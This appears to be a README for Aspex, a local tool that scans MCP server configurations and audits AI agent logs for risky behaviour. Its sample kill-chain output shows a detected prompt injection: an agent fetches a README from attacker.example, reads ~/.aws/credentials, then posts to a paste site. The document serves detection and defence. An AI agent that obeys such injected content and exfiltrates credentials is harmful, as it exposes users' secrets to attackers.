<div align="center">

<img src="docs/logo.svg" width="88" height="88" alt="Aspex logo"/>

# Aspex

### Security scanner and audit trail for AI agents that use MCP

**Know what your MCP servers can do. Know what your agents actually did.**

[![License: Apache-2.0](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](LICENSE)
[![CI](https://github.com/aspex-security/aspex/actions/workflows/ci.yml/badge.svg)](https://github.com/aspex-security/aspex/actions/workflows/ci.yml)
[![MCP-scanned by Aspex](https://img.shields.io/badge/MCP--scanned-by%20Aspex-5B44C3)](https://github.com/aspex-security/aspex)

```sh
brew install aspex-security/tap/aspex && aspex-scan
```

**Offline. No account. No data leaves your machine. Ever.**

</div>

---

## The problem

AI coding agents like Claude Code, Cursor, and Windsurf connect to tools through **MCP (Model Context Protocol)** - servers that give the agent access to your filesystem, your GitHub, your database, your browser. Most people install them by copy-pasting a config from a README.

That leaves two questions nobody can answer today:

1. **What can this server actually do to my machine?** - before you run it
2. **What did my agent actually do?** - after it ran

Aspex is one tool for each question.

| | Tool | Answers | How |
|---|---|---|---|
| **Before** | `aspex-scan` | What can it do? | Static analysis of every MCP server on your machine. 140+ rules, 0-100 score, cross-server attack paths. |
| **After** | `aspex-trace` | What did it do? | Reads the logs your AI client already writes. Reconstructs kill chains, traces where injected instructions came from. No proxy, no config change. |

---

## What it looks like

```
$ aspex-scan

  ◆  aspex-scan  v0.5.5

  Discovered 9 servers across claude, cursor, claude-code

  filesystem      41  ██████████░░░░░░░░░░░░░░  HIGH     3 findings
  github          78  ███████████████████░░░░░  MEDIUM   2 findings
  postgres        55  █████████████░░░░░░░░░░░  HIGH     4 findings
  slack           91  ██████████████████████░░  LOW      1 finding
  ...

  CRITICAL  MCP004  filesystem   write access to ~/  (entire home directory)
  CRITICAL  MCP006  postgres     DATABASE_URL hardcoded in config env block
  HIGH      MCP010  slack        remote server has no auth token

  Overall  61 / 100      2 cross-server attack paths detected

  Run aspex-scan --explain for WHY / EXPLOIT / IMPACT on each finding.
  Run aspex-scan attack-paths to see how servers chain together.
```

```
$ aspex-trace killchain --since 7d

  CRITICAL  Credential Exfiltration          cursor · session a3f2 · 14:02
    read_file  ~/.aws/credentials                        (filesystem)
    fetch_url  https://pastebin.example/api/paste   +11s  (browser)
    Source: web_fetch -> https://attacker.example/README.md  (12s earlier)
    Confidence: HIGH - tight temporal coupling
```

---

## Who this is for

- **Developers** using AI agents who want to vet an MCP server before trusting it with their machine
- **Security teams** who need visibility into what agents are doing across the org, in a format they can export to a SIEM
- **MCP server authors** who want to prove their server is safe (add the badge above to your README)

## What Aspex is not

- **Not a proxy or gateway.** It never sits in the request path and adds zero latency to your agent.
- **Not a blocker.** It audits and reports. You decide what to do.
- **Not a SaaS.** Everything runs locally. There is nothing to sign up for.

---

## Quick start

```sh
aspex                    # Interactive menu - arrow keys, enter to run
aspex-scan               # Audit every MCP server on this machine
aspex-scan doctor        # 2-second pre-flight check: leaked secrets, broad paths
aspex-scan --explain     # Full advisory on every finding
aspex-trace              # What did my agent do in the last 24 hours?
aspex-trace killchain    # Reconstruct multi-step attack patterns
```

Also included: `aspex-attack` for security teams who want to actively probe servers they own with adversarial payloads. Opt-in, and only against servers you have permission to test.

---

## Install

```sh
# macOS / Linux
brew install aspex-security/tap/aspex

# Linux / Windows WSL
curl -fsSL https://raw.githubusercontent.com/aspex-security/aspex/main/install.sh | sh

# Manual: download a binary from GitHub releases
# https://github.com/aspex-security/aspex/releases
```

Supports Claude Desktop, Claude Code, Cursor, Windsurf, Cline, Roo-Cline, Continue, and Zed.

---

## CI

Fail a pipeline when a config change introduces a risky server:

```yaml
- uses: aspex-security/aspex/.github/actions/aspex-scan-action@main
  with:
    fail-on: high
```

Emits SARIF for GitHub Code Scanning. See the [CI guide](https://aspex.mintlify.site/guides/ci-integration).

---

## Documentation

**[aspex.mintlify.site](https://aspex.mintlify.site)** - full reference, guides, rule catalog

- [aspex-scan reference](https://aspex.mintlify.site/tools/scan)
- [aspex-trace reference](https://aspex.mintlify.site/tools/trace)
- [All 225+ detection rules](https://aspex.mintlify.site/reference/rules) - mapped to OWASP LLM Top 10, MITRE ATLAS, CWE
- [Daily workflow guide](https://aspex.mintlify.site/guides/daily-workflow)

---

## Privacy

Aspex never sends configs, findings, file paths, or tool names anywhere. No telemetry. No account. No proxy. The only network call is downloading the binary at install time.

Every release ships SHA-256 checksums and a full SPDX software bill of materials.

For fleet-wide coverage and enterprise policy enforcement, see [Onyx Security](https://onyx.security).

---

## Contributing

The most impactful contributions are new detection rules and log format updates as clients evolve. Adding a rule takes about 15 minutes - see [CONTRIBUTING.md](CONTRIBUTING.md).

Security issues: do not open a public issue. Email steven.d@onyx.security.

---

## License

Apache-2.0. See [LICENSE](LICENSE). Built and maintained by [Onyx Security](https://onyx.security). Free forever.
